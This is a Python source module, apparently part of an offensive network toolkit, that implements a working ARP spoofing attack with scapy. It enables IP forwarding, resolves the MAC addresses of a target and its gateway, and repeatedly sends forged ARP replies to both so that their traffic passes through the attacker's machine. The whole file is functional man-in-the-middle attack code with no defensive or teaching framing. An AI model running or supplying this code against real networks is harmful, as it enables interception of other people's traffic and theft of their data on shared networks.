"""     libs       """
# external
from scapy.all import sendp, ARP, Ether
from time import sleep

# internal
from lib.GPL.attackers.network.IP_To_MAC import gpl_ip_to_mac
from lib.GPL.attackers.network.IP_Exists import gpl_ipv4_icmp_exists_check
from lib.GPL.attackers.network.IP_Forwarding import gpl_set_ipv4_forward_state
from lib.core.Error_Handler import Handler
import lib.config.Error_Levels as Error_Levels
from lib.config.GPL import ARP_Spoof_Resend_Sleep

"""     local       """
ARP_SPOOF_RUN = True

"""     GPL     """
# arp spoof attack once
#
# external:
# from scapy.all import sendp, ARP, Ether
#
# version
# 1
def gpl_arp_spoof_fake_once(Target_IP, Target_MAC, Gateway_IP):
    Fake_ARP = Ether(dst=Target_MAC) / ARP(psrc=Gateway_IP, pdst=Target_IP, hwdst=Target_MAC, op="is-at")
    try:
        sendp(Fake_ARP, verbose=0)
    except:
        return False
    else:
        return True


# stop arp spoof
#
# version
# 1
def gpl_arp_spoof_end_attack_thread():
    global ARP_SPOOF_RUN
    ARP_SPOOF_RUN = False


# arp spoof attack
#
# internal:
# gpl_ipv4_icmp_exists_check
# gpl_ip_to_mac
#
# note:
# if return None, connection lose or IP(s) not wakeup
#
# version
# 1
def gpl_arp_spoof_thread(target_IP, gateway_IP, ignore_IP_exists_check=False, print_log=False):
    global ARP_SPOOF_RUN
    try:
        gpl_set_ipv4_forward_state(True)
        Target_State = gpl_ipv4_icmp_exists_check(target_IP)
        Gateway_State = gpl_ipv4_icmp_exists_check(gateway_IP)
        if (Target_State == True and Gateway_State == True) or ignore_IP_exists_check:
            Target_MAC = gpl_ip_to_mac(target_IP)
            Gateway_MAC = gpl_ip_to_mac(gateway_IP)
            while ARP_SPOOF_RUN:
                if print_log:
                    Handler(Error_Levels.Alert, 'Send ArpSpoof between "' + target_IP + '" (' + Target_MAC + ') and "' + gateway_IP + '" (' + Gateway_MAC + ')')
                # target -> hacker -> gateway
                gpl_arp_spoof_fake_once(target_IP, Target_MAC, gateway_IP)
                # gatewat -> hacker -> target
                gpl_arp_spoof_fake_once(gateway_IP, Gateway_MAC, target_IP)
                sleep(ARP_Spoof_Resend_Sleep)
            ARP_SPOOF_RUN = True
        else:
            return None
    except (KeyboardInterrupt, EOFError):
        gpl_set_ipv4_forward_state(False)
        raise KeyboardInterrupt
